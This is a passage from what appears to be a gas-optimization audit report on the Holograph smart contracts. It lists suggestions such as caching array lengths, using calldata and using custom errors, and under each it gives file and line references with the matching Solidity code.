2022-10-holograph/contracts/enforcer/HolographERC721.sol::357 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::716 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::307 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::323 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::340 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::356 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::394 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::414 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::432 => for (uint256 t = 0; t < tokenAddresses.length; t++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {
```

## [G-02] Cache Array Length Outside of Loop

Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.

```
2022-10-holograph/contracts/HolographOperator.sol::871 => for (uint256 i = _operatorPods.length; i <= pod; i++) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::432 => for (uint256 t = 0; t < tokenAddresses.length; t++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {
```

## [G-03] Using > 0 costs more gas than != 0 when used on a uint in a require() statement

When dealing with unsigned integer types, comparisons with != 0 are cheaper then with > 0. This change saves 6 gas per instance

```
2022-10-holograph/contracts/HolographOperator.sol::309 => require(_operatorJobs[hash] > 0, "HOLOGRAPH: invalid job");
2022-10-holograph/contracts/HolographOperator.sol::350 => require(timeDifference > 0, "HOLOGRAPH: operator has time");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::815 => require(tokenId > 0, "ERC721: token id cannot be zero");
```

## [G-04] Long Revert Strings

Shortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.

If the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec.

```
2022-10-holograph/contracts/enforcer/PA1D.sol::411 => require(balance > 10000, "PA1D: Not enough tokens to transfer");
2022-10-holograph/contracts/enforcer/PA1D.sol::435 => require(balance > 10000, "PA1D: Not enough tokens to transfer");
```

## [G-05] Use calldata instead of memory

Use calldata instead of memory for function parameters saves gas if the function argument is only read.

```
2022-10-holograph/contracts/HolographBridge.sol::162 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/HolographFactory.sol::143 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/HolographOperator.sol::240 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/abstract/ERC20H.sol::140 => function init(bytes memory initPayload) external virtual override returns (bytes4) {
2022-10-holograph/contracts/abstract/ERC721H.sol::140 => function init(bytes memory initPayload) external virtual override returns (bytes4) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::218 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::238 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/enforcer/Holographer.sol::147 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/enforcer/PA1D.sol::173 => function init(bytes memory initPayload) external override returns (bytes4) {
2022-10-holograph/contracts/enforcer/PA1D.sol::185 => function initPA1D(bytes memory initPayload) external returns (bytes4) {
2022-10-holograph/contracts/enforcer/PA1D.sol::365 => function _getTokenAddress(string memory tokenName) private view returns (address tokenAddress) {
2022-10-holograph/contracts/enforcer/PA1D.sol::683 => function getTokenAddress(string memory tokenName) public view returns (address) {
2022-10-holograph/contracts/module/LayerZeroModule.sol::158 => function init(bytes memory initPayload) external override returns (bytes4) {
```

## [G-06] Functions guaranteed to revert when called by normal users can be marked payable

If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost

```
2022-10-holograph/contracts/HolographBridge.sol::452 => function setFactory(address factory) external onlyAdmin {
2022-10-holograph/contracts/HolographBridge.sol::472 => function setHolograph(address holograph) external onlyAdmin {
2022-10-holograph/contracts/HolographBridge.sol::502 => function setOperator(address operator) external onlyAdmin {
2022-10-holograph/contracts/HolographBridge.sol::522 => function setRegistry(address registry) external onlyAdmin {
2022-10-holograph/contracts/HolographFactory.sol::280 => function setHolograph(address holograph) external onlyAdmin {
2022-10-holograph/contracts/HolographFactory.sol::300 => function setRegistry(address registry) external onlyAdmin {
2022-10-holograph/contracts/HolographOperator.sol::949 => function setBridge(address bridge) external onlyAdmin {
2022-10-holograph/contracts/HolographOperator.sol::969 => function setHolograph(address holograph) external onlyAdmin {
2022-10-holograph/contracts/HolographOperator.sol::989 => function setInterfaces(address interfaces) external onlyAdmin {
2022-10-holograph/contracts/HolographOperator.sol::1009 => function setMessagingModule(address messagingModule) external onlyAdmin {
2022-10-holograph/contracts/HolographOperator.sol::1029 => function setRegistry(address registry) external onlyAdmin {
2022-10-holograph/contracts/HolographOperator.sol::1049 => function setUtilityToken(address utilityToken) external onlyAdmin {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::380 => function bridgeIn(uint32 fromChain, bytes calldata payload) external onlyBridge returns (bytes4) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::415 => function holographBridgeMint(address to, uint256 amount) external onlyBridge returns (bytes4) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::549 => function sourceBurn(address from, uint256 amount) external onlySource {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::556 => function sourceMint(address to, uint256 amount) external onlySource {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::563 => function sourceMintBatch(address[] calldata wallets, uint256[] calldata amounts) external onlySource {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::399 => function bridgeIn(uint32 fromChain, bytes calldata payload) external onlyBridge returns (bytes4) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::500 => function sourceBurn(uint256 tokenId) external onlySource {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::508 => function sourceMint(address to, uint224 tokenId) external onlySource {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::520 => function sourceGetChainPrepend() external view onlySource returns (uint256) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::577 => function sourceTransfer(address to, uint256 tokenId) external onlySource {
2022-10-holograph/contracts/module/LayerZeroModule.sol::320 => function setBridge(address bridge) external onlyAdmin {
2022-10-holograph/contracts/module/LayerZeroModule.sol::340 => function setInterfaces(address interfaces) external onlyAdmin {
2022-10-holograph/contracts/module/LayerZeroModule.sol::360 => function setLZEndpoint(address lZEndpoint) external onlyAdmin {
2022-10-holograph/contracts/module/LayerZeroModule.sol::380 => function setOperator(address operator) external onlyAdmin {
2022-10-holograph/contracts/module/LayerZeroModule.sol::441 => function setBaseGas(uint256 baseGas) external onlyAdmin {
2022-10-holograph/contracts/module/LayerZeroModule.sol::470 => function setGasPerByte(uint256 gasPerByte) external onlyAdmin {
```

## [G-07] Empty blocks should be removed or emit something

The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. 

```
2022-10-holograph/contracts/HolographBridge.sol::155 => constructor() {}
2022-10-holograph/contracts/HolographFactory.sol::136 => constructor() {}
2022-10-holograph/contracts/HolographOperator.sol::233 => constructor() {}
2022-10-holograph/contracts/HolographOperator.sol::1209 => receive() external payable {}
2022-10-holograph/contracts/abstract/ERC20H.sol::133 => constructor() {}
2022-10-holograph/contracts/abstract/ERC20H.sol::212 => receive() external payable {}
2022-10-holograph/contracts/abstract/ERC721H.sol::133 => constructor() {}
2022-10-holograph/contracts/abstract/ERC721H.sol::212 => receive() external payable {}
2022-10-holograph/contracts/enforcer/HolographERC20.sol::211 => constructor() {}
2022-10-holograph/contracts/enforcer/HolographERC20.sol::251 => receive() external payable {}
2022-10-holograph/contracts/enforcer/HolographERC721.sol::231 => constructor() {}
2022-10-holograph/contracts/enforcer/HolographERC721.sol::962 => receive() external payable {}
2022-10-holograph/contracts/enforcer/Holographer.sol::140 => constructor() {}
2022-10-holograph/contracts/enforcer/Holographer.sol::223 => receive() external payable {}
2022-10-holograph/contracts/enforcer/PA1D.sol::166 => constructor() {}
2022-10-holograph/contracts/module/LayerZeroModule.sol::151 => constructor() {}
```

## [G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead

When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.

```
2022-10-holograph/contracts/HolographOperator.sol::208 => uint32 private _operatorTempStorageCounter;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::181 => uint8 private _decimals;
2022-10-holograph/contracts/enforcer/HolographERC721.sol::160 => uint16 private _bps;
2022-10-holograph/contracts/module/LayerZeroModule.sol::265 => (uint128 dstPriceRatio, uint128 dstGasPriceInWei) = _getPricing(lz, lzDestChain);
2022-10-holograph/contracts/module/LayerZeroModule.sol::289 => (uint128 dstPriceRatio, uint128 dstGasPriceInWei) = _getPricing(lz, lzDestChain);
```

## [G-09] Using bools for storage incurs overhead

Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.
Use uint256(1) and uint256(2) for true/false instead

```
2022-10-holograph/contracts/HolographOperator.sol::198 => mapping(bytes32 => bool) private _failedJobs;
2022-10-holograph/contracts/enforcer/HolographERC721.sol::196 => mapping(address => mapping(address => bool)) private _operatorApprovals;
2022-10-holograph/contracts/enforcer/HolographERC721.sol::206 => mapping(uint256 => bool) private _burnedTokens;
```

## [G-10] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, for example when used in for- and while-loops

The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop

```
2022-10-holograph/contracts/HolographOperator.sol::781 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/HolographOperator.sol::871 => for (uint256 i = _operatorPods.length; i <= pod; i++) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::307 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::323 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::340 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::356 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::394 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::414 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::432 => for (uint256 t = 0; t < tokenAddresses.length; t++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {
```

## [G-11] <x> += <y> costs more gas than <x> = <x> + <y> for state variables

use <x> = <x> + <y> or <x> = <x> - <y> instead to save gas

```
2022-10-holograph/contracts/HolographFactory.sol::328 => v += 27;
2022-10-holograph/contracts/HolographOperator.sol::378 => _bondedAmounts[job.operator] -= amount;
2022-10-holograph/contracts/HolographOperator.sol::382 => _bondedAmounts[msg.sender] += amount;
2022-10-holograph/contracts/HolographOperator.sol::834 => _bondedAmounts[operator] += amount;
2022-10-holograph/contracts/HolographOperator.sol::1175 => position -= threshold;
2022-10-holograph/contracts/HolographOperator.sol::1177 => current += (current / _operatorThresholdDivisor) * (position / _operatorThresholdStep);
2022-10-holograph/contracts/enforcer/HolographERC20.sol::633 => _totalSupply -= amount;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::685 => _totalSupply += amount;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::686 => _balances[to] += amount;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::702 => _balances[recipient] += amount;
```

## [G-12] abi.encode() is less efficient than abi.encodePacked()

use abi.encodePacked() where possible to save gas

```
2022-10-holograph/contracts/HolographFactory.sol::252 => abi.encode(abi.encode(config.chainType, holograph, config.contractType, sourceContractAddress), config.initCode)
2022-10-holograph/contracts/enforcer/HolographERC20.sol::409 => return (Holographable.bridgeOut.selector, abi.encode(from, to, amount, data));
2022-10-holograph/contracts/enforcer/HolographERC20.sol::471 => abi.encode(
2022-10-holograph/contracts/enforcer/HolographERC721.sol::260 => abi.encodeWithSignature("initPA1D(bytes)", abi.encode(address(this), uint256(contractBps)))
2022-10-holograph/contracts/enforcer/HolographERC721.sol::426 => return (Holographable.bridgeOut.selector, abi.encode(from, to, tokenId, data));
```

## [G-13] Use custom errors rather than revert()/require() strings to save gas

Custom errors are available from solidity version 0.8.4. Custom errors save ~50 gas each time they're hitby avoiding having to allocate and store the revert string. Not defining the strings also save deployment gas

```
2022-10-holograph/contracts/HolographBridge.sol::148 => require(msg.sender == address(_operator()), "HOLOGRAPH: operator only call");
2022-10-holograph/contracts/HolographBridge.sol::163 => require(!_isInitialized(), "HOLOGRAPH: already initialized");
2022-10-holograph/contracts/HolographBridge.sol::214 => require(selector == Holographable.bridgeIn.selector, "HOLOGRAPH: bridge in failed");
2022-10-holograph/contracts/HolographBridge.sol::233 => require(doNotRevert, "HOLOGRAPH: reverted");
2022-10-holograph/contracts/HolographBridge.sol::270 => require(selector == Holographable.bridgeOut.selector, "HOLOGRAPH: bridge out failed");
2022-10-holograph/contracts/HolographFactory.sol::144 => require(!_isInitialized(), "HOLOGRAPH: already initialized");
2022-10-holograph/contracts/HolographFactory.sol::220 => require(_verifySigner(signature.r, signature.s, signature.v, hash, signer), "HOLOGRAPH: invalid signature");
2022-10-holograph/contracts/HolographFactory.sol::228 => require(!_isContract(holographerAddress), "HOLOGRAPH: already deployed");
2022-10-holograph/contracts/HolographOperator.sol::241 => require(!_isInitialized(), "HOLOGRAPH: already initialized");
2022-10-holograph/contracts/HolographOperator.sol::309 => require(_operatorJobs[hash] > 0, "HOLOGRAPH: invalid job");
2022-10-holograph/contracts/HolographOperator.sol::350 => require(timeDifference > 0, "HOLOGRAPH: operator has time");
2022-10-holograph/contracts/HolographOperator.sol::354 => require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected");
2022-10-holograph/contracts/HolographOperator.sol::368 => require(fallbackOperator == msg.sender, "HOLOGRAPH: invalid fallback");
2022-10-holograph/contracts/HolographOperator.sol::415 => require(gasleft() > gasLimit, "HOLOGRAPH: not enough gas left");
2022-10-holograph/contracts/HolographOperator.sol::446 => require(msg.sender == address(this), "HOLOGRAPH: operator only call");
2022-10-holograph/contracts/HolographOperator.sol::485 => require(msg.sender == address(_messagingModule()), "HOLOGRAPH: messaging only call");
2022-10-holograph/contracts/HolographOperator.sol::591 => require(msg.sender == _bridge(), "HOLOGRAPH: bridge only call");
2022-10-holograph/contracts/HolographOperator.sol::595 => require(hlgFee < msg.value, "HOLOGRAPH: not enough value");
2022-10-holograph/contracts/HolographOperator.sol::728 => require(_operatorPods.length >= pod, "HOLOGRAPH: pod does not exist");
2022-10-holograph/contracts/HolographOperator.sol::739 => require(_operatorPods.length >= pod, "HOLOGRAPH: pod does not exist");
2022-10-holograph/contracts/HolographOperator.sol::756 => require(_operatorPods.length >= pod, "HOLOGRAPH: pod does not exist");
2022-10-holograph/contracts/HolographOperator.sol::829 => require(_bondedOperators[operator] != 0, "HOLOGRAPH: operator not bonded");
2022-10-holograph/contracts/HolographOperator.sol::839 => require(_utilityToken().transferFrom(msg.sender, address(this), amount), "HOLOGRAPH: token transfer failed");
2022-10-holograph/contracts/HolographOperator.sol::857 => require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, "HOLOGRAPH: operator is bonded");
2022-10-holograph/contracts/HolographOperator.sol::863 => require(current <= amount, "HOLOGRAPH: bond amount too small");
2022-10-holograph/contracts/HolographOperator.sol::881 => require(_operatorPods[pod - 1].length < type(uint16).max, "HOLOGRAPH: too many operators");
2022-10-holograph/contracts/HolographOperator.sol::889 => require(_utilityToken().transferFrom(msg.sender, address(this), amount), "HOLOGRAPH: token transfer failed");
2022-10-holograph/contracts/HolographOperator.sol::903 => require(_bondedOperators[operator] != 0, "HOLOGRAPH: operator not bonded");
2022-10-holograph/contracts/HolographOperator.sol::911 => require(_isContract(operator), "HOLOGRAPH: operator not contract");
2022-10-holograph/contracts/HolographOperator.sol::915 => require(Ownable(operator).isOwner(msg.sender), "HOLOGRAPH: sender not owner");
2022-10-holograph/contracts/HolographOperator.sol::932 => require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed");
2022-10-holograph/contracts/abstract/ERC20H.sol::117 => require(msg.sender == holographer(), "ERC20: holographer only");
2022-10-holograph/contracts/abstract/ERC20H.sol::123 => require(msgSender() == _getOwner(), "ERC20: owner only function");
2022-10-holograph/contracts/abstract/ERC20H.sol::125 => require(msg.sender == _getOwner(), "ERC20: owner only function");
2022-10-holograph/contracts/abstract/ERC20H.sol::147 => require(!_isInitialized(), "ERC20: already initialized");
2022-10-holograph/contracts/abstract/ERC721H.sol::117 => require(msg.sender == holographer(), "ERC721: holographer only");
2022-10-holograph/contracts/abstract/ERC721H.sol::123 => require(msgSender() == _getOwner(), "ERC721: owner only function");
2022-10-holograph/contracts/abstract/ERC721H.sol::125 => require(msg.sender == _getOwner(), "ERC721: owner only function");
2022-10-holograph/contracts/abstract/ERC721H.sol::147 => require(!_isInitialized(), "ERC721: already initialized");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::192 => require(msg.sender == _holograph().getBridge(), "ERC20: bridge only call");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::204 => require(msg.sender == sourceContract, "ERC20: source only call");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::219 => require(!_isInitialized(), "ERC20: already initialized");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::241 => require(sourceContract.init(initCode) == InitializableInterface.init.selector, "ERC20: could not init source");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::349 => require(currentAllowance >= amount, "ERC20: amount exceeds allowance");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::365 => require(currentAllowance >= subtractedValue, "ERC20: decreased below zero");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::387 => require(SourceERC20().bridgeIn(fromChain, from, to, amount, data), "HOLOGRAPH: bridge in failed");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::400 => require(currentAllowance >= amount, "ERC20: amount exceeds allowance");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::427 => require(newAllowance >= currentAllowance, "ERC20: increased above max value");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::445 => require(_isContract(account), "ERC20: operator not contract");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::450 => require(balance >= amount, "ERC20: balance check failed");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::469 => require(block.timestamp <= deadline, "ERC20: expired deadline");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::482 => require(signer == account, "ERC20: invalid signature");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::505 => require(_checkOnERC20Received(msg.sender, recipient, amount, data), "ERC20: non ERC20Receiver");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::529 => require(currentAllowance >= amount, "ERC20: amount exceeds allowance");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::539 => require(_checkOnERC20Received(account, recipient, amount, data), "ERC20: non ERC20Receiver");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::599 => require(currentAllowance >= amount, "ERC20: amount exceeds allowance");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::620 => require(account != address(0), "ERC20: account is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::621 => require(spender != address(0), "ERC20: spender is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::627 => require(account != address(0), "ERC20: account is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::629 => require(accountBalance >= amount, "ERC20: amount exceeds balance");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::645 => require(erc165support, "ERC20: no ERC165 support");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::684 => require(to != address(0), "ERC20: minting to burn address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::695 => require(account != address(0), "ERC20: account is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::696 => require(recipient != address(0), "ERC20: recipient is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::698 => require(accountBalance >= amount, "ERC20: amount exceeds balance");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::212 => require(msg.sender == _holograph().getBridge(), "ERC721: bridge only call");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::224 => require(msg.sender == sourceContract, "ERC721: source only call");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::239 => require(!_isInitialized(), "ERC721: already initialized");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::258 => require(sourceContract.init(initCode) == InitializableInterface.init.selector, "ERC721: could not init source");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::263 => require(success && selector == InitializableInterface.init.selector, "ERC721: coud not init PA1D");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::323 => require(_exists(tokenId), "ERC721: token does not exist");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::370 => require(to != tokenOwner, "ERC721: cannot approve self");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::371 => require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::388 => require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::404 => require(!_exists(tokenId), "ERC721: token already exists");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::408 => require(SourceERC721().bridgeIn(fromChain, from, to, tokenId, data), "HOLOGRAPH: bridge in failed");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::419 => require(to != address(0), "ERC721: zero address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::420 => require(_isApproved(sender, tokenId), "ERC721: sender not approved");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::421 => require(from == _tokenOwner[tokenId], "ERC721: from is not owner");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::458 => require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::484 => require(to != msg.sender, "ERC721: cannot approve self");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::513 => require(!_burnedTokens[token], "ERC721: can't mint burned token");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::622 => require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::639 => require(wallet != address(0), "ERC721: zero address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::689 => require(tokenOwner != address(0), "ERC721: token does not exist");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::700 => require(index < _allTokens.length, "ERC721: index out of bounds");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::729 => require(index < balanceOf(wallet), "ERC721: index out of bounds");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::757 => require(_isContract(_operator), "ERC721: operator not contract");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::762 => require(tokenOwner == address(this), "ERC721: contract not token owner");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::815 => require(tokenId > 0, "ERC721: token id cannot be zero");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::816 => require(to != address(0), "ERC721: minting to burn address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::817 => require(!_exists(tokenId), "ERC721: token already exists");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::818 => require(!_burnedTokens[tokenId], "ERC721: token has been burned");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::869 => require(_tokenOwner[tokenId] == from, "ERC721: token not owned");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::870 => require(to != address(0), "ERC721: use burn instead");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::906 => require(_exists(tokenId), "ERC721: token does not exist");
2022-10-holograph/contracts/enforcer/Holographer.sol::148 => require(!_isInitialized(), "HOLOGRAPHER: already initialized");
2022-10-holograph/contracts/enforcer/Holographer.sol::166 => require(success && selector == InitializableInterface.init.selector, "initialization failed");
2022-10-holograph/contracts/enforcer/PA1D.sol::159 => require(isOwner(), "PA1D: caller not an owner");
2022-10-holograph/contracts/enforcer/PA1D.sol::174 => require(!_isInitialized(), "PA1D: already initialized");
2022-10-holograph/contracts/enforcer/PA1D.sol::190 => require(initialized == 0, "PA1D: already initialized");
2022-10-holograph/contracts/enforcer/PA1D.sol::390 => require(balance - gasCost > 10000, "PA1D: Not enough ETH to transfer");
2022-10-holograph/contracts/enforcer/PA1D.sol::411 => require(balance > 10000, "PA1D: Not enough tokens to transfer");
2022-10-holograph/contracts/enforcer/PA1D.sol::416 => require(erc20.transfer(addresses[i], sending), "PA1D: Couldn't transfer token");
2022-10-holograph/contracts/enforcer/PA1D.sol::435 => require(balance > 10000, "PA1D: Not enough tokens to transfer");
2022-10-holograph/contracts/enforcer/PA1D.sol::439 => require(erc20.transfer(addresses[i], sending), "PA1D: Couldn't transfer token");
2022-10-holograph/contracts/enforcer/PA1D.sol::460 => require(matched, "PA1D: sender not authorized");
2022-10-holograph/contracts/enforcer/PA1D.sol::472 => require(addresses.length == bps.length, "PA1D: missmatched array lenghts");
2022-10-holograph/contracts/enforcer/PA1D.sol::477 => require(totalBp == 10000, "PA1D: bps down't equal 10000");
2022-10-holograph/contracts/module/LayerZeroModule.sol::159 => require(!_isInitialized(), "HOLOGRAPH: already initialized");
2022-10-holograph/contracts/module/LayerZeroModule.sol::235 => require(msg.sender == address(_operator()), "HOLOGRAPH: operator only call");
```

## [G-14] Prefix increments cheaper than Postfix increments

++i costs less gas than i++, especially when it's used in for-loops (--i/i-- too)
Saves 5 gas PER LOOP

```
2022-10-holograph/contracts/HolographOperator.sol::781 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/HolographOperator.sol::871 => for (uint256 i = _operatorPods.length; i <= pod; i++) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::357 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::716 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::307 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::323 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::340 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::356 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::394 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::414 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {
2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {
```

## [G-15] Use bytes32 instead of string

Use bytes32 instead of string to save gas whenever possible. String is a dynamic data structure and therefore is more gas consuming then bytes32.

```
2022-10-holograph/contracts/enforcer/PA1D.sol::142 => string constant _bpString = "eip1967.Holograph.PA1D.bp";
2022-10-holograph/contracts/enforcer/PA1D.sol::143 => string constant _receiverString = "eip1967.Holograph.PA1D.receiver";
2022-10-holograph/contracts/enforcer/PA1D.sol::144 => string constant _tokenAddressString = "eip1967.Holograph.PA1D.tokenAddress";
```

## [G-16] Splitting require() statements that use && saves gas

Saves 16 gas per instance.
If you're using the Optimizer at 200, instead of using the && operator in a single require statement to check multiple conditions, multiple require statements with 1 condition per require statement should be used to save gas:

```
2022-10-holograph/contracts/HolographOperator.sol::857 => require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, "HOLOGRAPH: operator is bonded");
